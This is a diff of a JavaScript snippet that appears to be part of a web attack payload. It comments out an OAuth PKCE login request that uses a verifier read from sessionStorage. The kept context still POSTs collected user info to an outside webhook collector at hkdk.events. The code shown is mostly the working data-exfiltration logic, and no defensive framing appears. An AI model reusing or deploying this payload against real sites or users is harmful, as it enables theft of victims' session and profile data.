@@ -8,25 +8,25 @@
 				method: 'POST',
 				body: 'test0',
 			});
-			const b64url = (b) => btoa(String.fromCharCode.apply(null, new Uint8Array(b))).split('+').join('-').split('/').join('_').split('=').join('');
-			const verifier =  sessionStorage.getItem('sketchy_pkce');
-			const digest = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(verifier));
-			const url = new URL('https://login.sketchycompany.upd-dcs.work/authorize');
-			url.search = new URLSearchParams({
-				response_type: 'code',
-				client_id: 'CLIENT123',
-				redirect_uri: 'https://portal.sketchycompany.upd-dcs.work/callback',
-				code_challenge: b64url(digest),
-				code_challenge_method: 'S256',
-				state: b64url(crypto.getRandomValues(new Uint8Array(16))),
-				scope: 'profile'
-			}).toString();
+			// const b64url = (b) => btoa(String.fromCharCode.apply(null, new Uint8Array(b))).split('+').join('-').split('/').join('_').split('=').join('');
+			// const verifier =  sessionStorage.getItem('sketchy_pkce');
+			// const digest = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(verifier));
+			// const url = new URL('https://login.sketchycompany.upd-dcs.work/authorize');
+			// url.search = new URLSearchParams({
+			// 	response_type: 'code',
+			// 	client_id: 'CLIENT123',
+			// 	redirect_uri: 'https://portal.sketchycompany.upd-dcs.work/callback',
+			// 	code_challenge: b64url(digest),
+			// 	code_challenge_method: 'S256',
+			// 	state: b64url(crypto.getRandomValues(new Uint8Array(16))),
+			// 	scope: 'profile'
+			// }).toString();
 
-			let body = {};
+			// let body = {};
 
-			const loginRes = await fetch(url.toString(), {
-				method: 'GET'
-			});
+			// const loginRes = await fetch(url.toString(), {
+			// 	method: 'GET'
+			// });
 			// const loginData = await loginRes.text();
 
 			await fetch('https://hkdk.events/lxjnpl4yoq2m7x', {
@@ -42,11 +42,11 @@
 
 				body = {
 					userInfo: data,
-					login: loginData
+					// login: loginData
 				}
 			} catch (e) {
 				body = {
-					login: loginData,
+					// login: loginData,
 					error: e.message
 				}
 			}
